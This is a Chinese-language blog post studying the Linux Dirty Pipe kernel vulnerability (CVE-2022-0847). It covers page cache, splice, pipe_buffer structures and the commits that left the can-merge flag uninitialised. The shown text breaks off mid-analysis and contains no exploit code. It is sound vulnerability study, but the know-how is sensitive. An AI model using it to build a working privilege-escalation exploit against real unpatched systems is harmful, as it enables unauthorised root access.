

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatar.jpg">
  <link rel="icon" href="/img/Avatar.jpg">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="断断续续慢慢跟完了整个漏洞，基本都是拾人牙慧缝合他人记录而形成自己的笔记，内容有点啰嗦和繁琐，但也想记录下自己跟的整个历程，并尝试以自己的逻辑表达出来">
  <meta name="author" content="corp0ra1">
  <meta name="keywords" content="">
  
  <title>The Dirty Pipe Vulnerability[学习记录] - corp0ra1&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"corp0ra1.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a1a4ccab78dfa522556928ac810fa739","google":"G-4X9XV0H0D5","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="corp0ra1's Blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 60vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
    <div class="container">
        <a class="navbar-brand" href="/">&nbsp;<strong>Corp0ra1's Blog</strong>&nbsp;</a>

        <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

        <!-- Collapsible content -->
        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav ml-auto text-center">
                
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
                                        </li>
                                        
                                            
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
                                        </li>
                                        
                                            
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
                                        </li>
                                        
                                            
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
                                        </li>
                                        
                                            
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
                                        </li>
                                        
                                            
                                                
                                                    <li class="nav-item" id="search-btn">
                                                        <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
                                                    </li>
                                                    
                                                        
                                                            <li class="nav-item" id="color-toggle-btn">
                                                                <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
                                                            </li>
                                                            
                                                                <li class="nav-item">
                                                                    <a class="nav-link" href="/atom.xml">
                                                                        <i class="iconfont icon-rss"></i>
                                                                    </a>
                                                                </li>
            </ul>
        </div>
    </div>
</nav>
    <div class="banner" id="banner" parallax=true
         style="background: url('/img/tesla.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="The Dirty Pipe Vulnerability[学习记录]">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-04-10 11:39" pubdate>
        2022年4月10日 中午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      9.3k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      114
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

    <div class="container-fluid nopadding-x">
        <div class="row nomargin-x">
            <div class="d-none d-lg-block col-lg-2"></div>
            <div class="col-lg-8 nopadding-x-md">
                <div class="container nopadding-x-md" id="board-ctn">
                    <div class="py-5" id="board">
                        <article class="post-content mx-auto">
                            <!-- SEO header -->
                            <h1 style="display: none">
                                The Dirty Pipe Vulnerability[学习记录]
                            </h1>
                            <div class="markdown-body">
                                <blockquote>
<p>本人Web手，初探内核漏洞，不会GDB调，只能反复研读他人资料，拾人牙慧。</p>
<p>全文基本都是缝合他人的资料，以形成自己的理解逻辑。介意的请Ctrl+F4,或者跳转文末看相关参考链接</p>
</blockquote>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><strong>CVE编号</strong>：<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847">CVE-2022-0847</a></li>
<li><strong>描述</strong>：在Linux内核中，新引入的管道缓冲区结构中的“flags”成员在<code>copy_page_to_iter_pipe</code>和<code>push_pipe函数</code>中缺少正确初始化，因此可能包含之前的值，这是一个问题。未经授权的本地用户可以使用此漏洞写入由只读文件支持的页面缓存中的页面，从而提升他们在系统上的权限。</li>
<li><strong>漏洞发现过程</strong>：<a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability -by Max Kellermann</a> 。<a href="https://corp0ra1.github.io/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/">中文翻译版本 -by corp0ra1</a></li>
<li><strong>漏洞影响版本</strong>：5.8 &lt;= Linux内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</li>
<li><strong>漏洞CVSS评分</strong>：7.8</li>
<li><strong>危害等级</strong>：高危</li>
<li><strong>修复方案</strong>：升级Linux内核到5.16.11、5.15.25、5.10.102及以上版本。</li>
</ul>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="Page和Page-Cache"><a href="#Page和Page-Cache" class="headerlink" title="Page和Page Cache"></a>Page和Page Cache</h2><p>CPU管理的最小内存单位是一个<code>页面(Page)</code>, 一个页面通常为4KB大小, Linux内存管理的最底层的一切都是关于页面的, 文件IO也是如此, 如果程序从文件中读取数据, 内核将先把它从磁盘读取到专属于内核的<code>页面缓存(Page Cache)</code>中, 后续再把它从内核区域复制到用户程序的内存空间中;</p>
<ol>
<li><strong>背景</strong>：磁盘的IO读写速度非常慢，所以通常在访问磁盘文件时，首先将其内容加载到物理内存中，然后再直接访问内存中的副本以读取数据。由于文件的内存拷贝，以后可能会被许多进程打开和使用。比如微信可能会打开本地文本，word软件也可能会打开相同的文本，使用副本就不用重复加载。</li>
<li><strong>解决方案</strong>：为了确保每个人都能快速访问，Linux设计了一种页面缓存机制来管理物理内存中映射的页面帧。如果用户进程使用读/写来读写文件，内核将首先将加载数据的物理内存映射到内核虚拟内存缓冲区。然后将内核缓冲区数据复制到用户模式。<br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled.png" srcset="/img/loading.gif" lazyload></li>
<li><strong>管道与界面缓存</strong>：不仅文件使用Page Cache，管道也使用Page Cache。在内核中，pipe的数据结构管理如下：pipe有一个大小为16的环形缓冲区数组，其中存储16个pipe_buf结构，每个pipe_buf结构都有一个指向表示物理内存页的结构的指针。每个页面的大小为4KB（不是连续存储）。<br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%201.png" srcset="/img/loading.gif" lazyload>  </li>
</ol>
<h2 id="splice和零拷贝"><a href="#splice和零拷贝" class="headerlink" title="splice和零拷贝"></a>splice和零拷贝</h2><ol>
<li>背景：每一次都把文件数据从内核空间拷贝到用户空间, 将会拖慢系统的运行速度, 也会额外消耗很多内存空间</li>
<li>零拷贝技术：如果追求效率，内核还提供零拷贝模式（无系统调用，跨用户和内核边界切换上下文）:通过mmap方法，将文件映射到用户进程虚拟内存空间，代替<code>read/write/ioctl</code>的访问方式，此时内存拷贝过程只有“用户空间到虚拟内存空间”，省去了“用户到内核”的拷贝过程，在数据量大的情况下能显著提升读写效率。</li>
<li>splice()与零拷贝技术：Linux 2.6.17新加入的系统调用<code>splice()</code>,用于在两个文件间移动数据，而无需内核态和用户态的内存拷贝，但需要借助管道实现。<ol>
<li>解释一：splice在实现上，使用指向管道缓存页的指针指向文件缓存页(前文提及“不仅文件使用Page Cache，管道也使用Page Cache”)</li>
<li>解释二：目标文件的页面缓存数据不会直接复制到Pipe的环形缓冲区内, 而是以索引的方式(即 内存页框地址、偏移量、长度 所表示的一块内存区域)复制到了pipe_buffer的结构体中, 如此就避免了从内核空间向用户空间的数据拷贝过程, 所以被称为”零拷贝”;</li>
<li>解释三：通过pipe buffer实现一组内核内存页（pages of kernel memory）的引用计数指针（reference-countedpointers），数据拷贝过程中并不真正拷贝数据，而是创建一个新的指向内存页的指针。也就是说拷贝过程实质是指针的拷贝，称为零拷贝技术。</li>
</ol>
</li>
<li>补充：splice底层实现，校验了file的读属性，但是没有校验写权限→漏洞产生原因之一</li>
<li>splice()函数的定义，如下图，内容源自：<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/splice.2.html">splice(2) — Linux manual page</a><br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%202.png" srcset="/img/loading.gif" lazyload></li>
</ol>
<h2 id="pipe相关"><a href="#pipe相关" class="headerlink" title="pipe相关"></a>pipe相关</h2><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><ol>
<li>概念：管道(Pipe)是一个程序向另一个程序发送数据的一种方式, </li>
<li>目的：将管道视为一个程序无需先将其写入磁盘即可与另一个程序对话的一种方式，这通常会加快程序速度。</li>
<li>特点：它包含一个输入端和一个输出端, 程序将数据从一段输入, 从另一端读出; 在内核中, 为了实现这种数据通信, 需要以页面(Page)为单位维护一个<code>环形缓冲区</code>(pipe_buffer), 它通常最多包含16个页面, 且可以被循环利用;</li>
</ol>
<h3 id="pipe-buffer的merge操作"><a href="#pipe-buffer的merge操作" class="headerlink" title="pipe buffer的merge操作"></a>pipe buffer的merge操作</h3><ol>
<li>背景：当一个程序使用管道写入数据时, pipe_write()调用会处理数据写入工作, 默认情况下, 多次写入操作是要写入环形缓冲区的一个新的页面的, 但是如果单次写入操作没有写满一个页面大小, 就会造成内存空间的浪费</li>
<li>解决方案：pipe_buffer中的每一个页面都包含一个<code>can_merge</code>属性, 该属性可以在下一次pipe_write()操作执行时, 指示内核继续向同一个页面继续写入数据, 而不是获取一个新的页面进行写入</li>
</ol>
<h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><ol>
<li>为什么了解这部分？pipe靠pipe_bufffer来管理page。<br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%203.png" srcset="/img/loading.gif" lazyload><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L57</span><br><br><span class="hljs-comment">//struct pipe_inode_info - a linux kernel pipe  为一个环形队列</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span>   <span class="hljs-comment">//指向pipe_buffer的指针</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span> <span class="hljs-comment">//为临时申请的界面</span><br><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head;<br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> tail; <br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> max_usage;<br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ring_size; <span class="hljs-comment">//为环形结构队列</span><br>	…… ……<br>&#125;<br><br><span class="hljs-comment">//struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span> <span class="hljs-comment">//the page containing the data for the pipe buffer</span><br>		<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> offset, len;<br>		<span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span> <span class="hljs-comment">//pipe_buf的相关操作</span><br>		<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags; <span class="hljs-comment">//pipe buffer的flags.见下面</span><br>		<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">private</span>;<br>	&#125;;<br><br><span class="hljs-comment">//默认的pipe_buffer为16个</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_DEF_BUFFERS	16   </span><br><span class="hljs-comment">//pipe_buffer的flag</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_GIFT	0x04	<span class="hljs-comment">/* page is a gift */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_PACKET	0x08	<span class="hljs-comment">/* read() as a packet */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE	0x10	<span class="hljs-comment">/* can merge buffers */</span></span><br></code></pre></td></tr></table></figure></li>
</ol>
<h3 id="pipe-buf-operations"><a href="#pipe-buf-operations" class="headerlink" title="pipe_buf_operations"></a>pipe_buf_operations</h3><p>说明：pipe_buf_operations只是个抽象，标识pipe_buffer的操作</p>
<p>为什么需要了解这部分？因为merge操作的时候涉及到匿名函数的判断</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/fs/pipe.c#L93</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>	<span class="hljs-comment">//-&gt;confirm()验证管道缓冲区中的数据是否存在以及内容是否良好。</span><br>	<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);<br>	<span class="hljs-comment">//当此管道缓冲区的内容已被读取器完全使用时，将调用--&gt;release（）。</span><br>	<span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);<br>	<span class="hljs-comment">//尝试获取管道缓冲区及其内容的所有权。</span><br>	<span class="hljs-comment">//try_steal()返回true表示成功，在这种情况下，管道(buf-&gt;page)的内容被锁定，并且完全归调用者所有。</span><br>	<span class="hljs-comment">//页面可能会被转移到不同的映射，最常用的情况是插入到不同的文件地址空间缓存中。</span><br>	<span class="hljs-built_in"><span class="hljs-keyword">bool</span></span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);<br>	<span class="hljs-comment">//获取对管道缓冲区的引用。</span><br>	<span class="hljs-built_in"><span class="hljs-keyword">bool</span></span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);<br>……………………<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_ops</span> =</span> &#123;<br>	.confirm = generic_pipe_buf_confirm,<br>	.release = anon_pipe_buf_release,<br>	.steal = anon_pipe_buf_steal,<br>	.get = generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_ops</span> =</span> &#123;<br>	.release	= anon_pipe_buf_release,<br>	.try_steal	= anon_pipe_buf_try_steal,<br>	.get		= generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">anon_pipe_buf_try_steal</span><span class="hljs-params">(struct pipe_inode_info *pipe,struct pipe_buffer *buf)</span></span>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> buf-&gt;page;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">page_count</span>(page) != <span class="hljs-number">1</span>)<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>	<span class="hljs-built_in">memcg_kmem_uncharge_page</span>(page, <span class="hljs-number">0</span>);<br>	__SetPageLocked(page);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="漏洞理解"><a href="#漏洞理解" class="headerlink" title="漏洞理解"></a>漏洞理解</h1><h2 id="开发者视角：关于can-merge标志的变更"><a href="#开发者视角：关于can-merge标志的变更" class="headerlink" title="开发者视角：关于can_merge标志的变更"></a>开发者视角：关于can_merge标志的变更</h2><ol>
<li>很久之前， <code>struct pipe_buf_operations</code> 有一个flag为<code>can_merge</code>  。目的使pipe_buf可以合并并复用，以提高利用效率。</li>
<li><strong>Linux 2.6.16, 2006</strong>：<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Commit 5274f052e7b3 “Introduce sys_splice() system call”</a> 。引入了<code>splice()</code>系统调用，同时引入了<code>page_cache_pipe_buf_ops</code>，这是一个<code>struct pipe_buf_operations</code>实现，用于pipe_buf来指向page cache。该结构体的第一个属性为<code>can_merge=0</code>（表示管道缓冲区不可合并）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// fs/splice.c #L70</span><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">page_cache_pipe_buf_ops</span> =</span> &#123;<br>	.can_merge = <span class="hljs-number">0</span>,<br>	.map = page_cache_pipe_buf_map,<br>	.unmap = page_cache_pipe_buf_unmap,<br>	.release = page_cache_pipe_buf_release,<br>&#125;;<br></code></pre></td></tr></table></figure>
</li>
<li><strong>Linux 5.1, 2019</strong>： <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">Commit 01e7187b4119 “pipe: stop using -&gt;can_merge”</a>将can_merge的flag重构为与<code>struct pipe_buf_operations</code>指针比较的函数<code>pipe_buf_can_merge()</code><ol>
<li>原因：因为只有一种类型的管道缓冲区<code>anon_pipe_buf_ops</code> 可以设置此标志为1，其他类型的则为0。但考虑到<code>can_merge</code>字段在结构体中占一个int大小的空间，因此把判断能否merge的操作改为指针判断，将所有的<code>pipe_buf_operations</code>结构体中的<code>can_merge</code>属性删除（包括splice.c中引入<code>page_cache_pipe_buf_ops</code>中的can_merge属性）。函数换变量，时间换空间，合情合理。<br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%204.png" srcset="/img/loading.gif" lazyload><br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%205.png" srcset="/img/loading.gif" lazyload><br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%206.png" srcset="/img/loading.gif" lazyload></li>
</ol>
</li>
<li><strong>Linux 5.8, 2020</strong>： <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops”</a>将判断merge与否的函数<code>pipe_buf_can_merge()</code> 重构为每个缓冲区flag<code>PIPE_BUF_FLAG_CAN_MERGE</code>.<br> 原因：<ol>
<li>因为这几个<code>pipe_buf_operations</code>类型的结构体的结构是相同的，只是通过结构体名次来区分packet和merge的行为而已，故考虑将之合并为一个结构体。</li>
<li>原本pipe_buf有一个flags属性来标记packet行为，那么可以通过复用该flags属性来区分packet和merge的行为</li>
<li>将函数又换回常量，但实现代码的简洁和原始操作的不变动。这个初衷也合理<br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%207.png" srcset="/img/loading.gif" lazyload>  </li>
</ol>
</li>
<li>总结can_merge的变换过程：从<code>pipe_buf_operations</code> 结构体中的属性，为了节省一个int的空间变为一个函数，再通过复用flags变量变成一个常量，每一步都合情合理。但是问题是：<ol>
<li>其他文件和其他函数中，使用了can_merge的部分的代码都发生相应改变了吗？→漏洞的原因：有个地方漏了</li>
<li>现在什么情况下会设置pipe_buffer的flag为can_merge→漏洞的触发点</li>
</ol>
</li>
</ol>
<h2 id="漏洞视角：copy-page-to-iter-pipe、page-cache-pipe-buf-ops和can-merge"><a href="#漏洞视角：copy-page-to-iter-pipe、page-cache-pipe-buf-ops和can-merge" class="headerlink" title="漏洞视角：copy_page_to_iter_pipe、page_cache_pipe_buf_ops和can_merge"></a>漏洞视角：copy_page_to_iter_pipe、page_cache_pipe_buf_ops和can_merge</h2><p>在can_merge变迁过程中被遗漏的函数<code>copy_page_to_iter_pipe()</code>，也是漏洞之因：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/241699cd72a8489c9446ae3910ddd243e9b9061b/lib/iov_iter.c#L339</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> <span class="hljs-title">copy_page_to_iter_pipe</span><span class="hljs-params">(struct page *page, <span class="hljs-keyword">size_t</span> offset, <span class="hljs-keyword">size_t</span> bytes,struct iov_iter *i)</span></span><br><span class="hljs-function"></span>&#123;<br><br>	…… ……<br>	<span class="hljs-comment">//[1] 将pipe_buffer指向当前需要写入的页的指针指向文件的缓存页，并设置其他信息，完成初始化操作</span><br>	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>	<span class="hljs-comment">//[2]  后续补丁是在此专门完成对pipe_buf中flag变量的初始化</span><br>	<span class="hljs-comment">//buf-&gt;flags = 0;</span><br>	<span class="hljs-built_in">get_page</span>(buf-&gt;page = page);<br>	buf-&gt;offset = offset;<br>	buf-&gt;len = bytes;<br>	…… ……<br>&#125;<br></code></pre></td></tr></table></figure>
<ol>
<li>Linux 2.6.16, 2006：最早<code>can_merge</code>标识在<code>ops</code>即<code>pipe_buf_operations</code>结构体中。<ol>
<li><code>pipe_buf_operations</code>有多种类型，比如<code>anon_pipe_buf_ops</code> 和<code>page_cache_pipe_buf_ops，</code>但是此时只有<code>anon_pipe_buf_ops</code>结构体中的<code>can_merge</code>属性为1，其他<code>ops</code>中则为0。可以理解为“<code>anon_pipe_buf_ops</code>和<code>can_merge</code>是强关联的”</li>
</ol>
</li>
<li>Linux 4.9,2016时期，<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit 243e9b9061b “new iov_iter flavour: pipe-backed”</a>：添加了iov_iter对Pipe的支持，引入了<code>copy_page_to_iter_pipe()</code>与<code>push_pipe()</code>函数。<ol>
<li>此时执行完<code>copy_page_to_iter_pipe()</code>函数中的<code>buf-&gt;ops = &amp;page_cache_pipe_buf_ops</code>操作，pipe buffer的<code>can_merge</code>的属性会被初始化为0</li>
</ol>
</li>
<li>Linux 5.1, 2019： <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">Commit 01e7187b4119 “pipe: stop using -&gt;can_merge”</a>将<code>can_merge</code>的flag转换为与<code>struct pipe_buf_operations</code>指针比较。<ol>
<li>此时执行完<code>buf-&gt;ops = &amp;page_cache_pipe_buf_ops</code>操作，pipe buffer的<code>can_merge</code>的属性会保留原属性，不会改变(<code>can_merge</code>属性已经被删除了)，引入了隐患</li>
<li>但是能否进行<code>can_merge</code>操作的判断是通过<code>pipe_buf_can_merge()</code>函数实现，而<code>pipe_buf_can_merge()</code>函数则是判断该<code>ops</code>是否为<code>anon_pipe_buf_ops</code> ，使得最终<code>can_merge</code>的判断还是和<code>anon_pipe_buf_ops</code>是强关联的。</li>
<li>即此时<code>page_cache_pipe_buf_ops</code>虽然没有<code>can_merge</code>属性，但其类型是非anon的，也能达到<code>can_merge=0</code>的效果，所以此时不会触发漏洞</li>
</ol>
</li>
<li>Linux 5.8, 2020： <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops”</a> 将<code>pipe_buf_can_merge()</code>函数中的指针比较转换为每个缓冲区的flag<code>PIPE_BUF_FLAG_CAN_MERGE</code><ol>
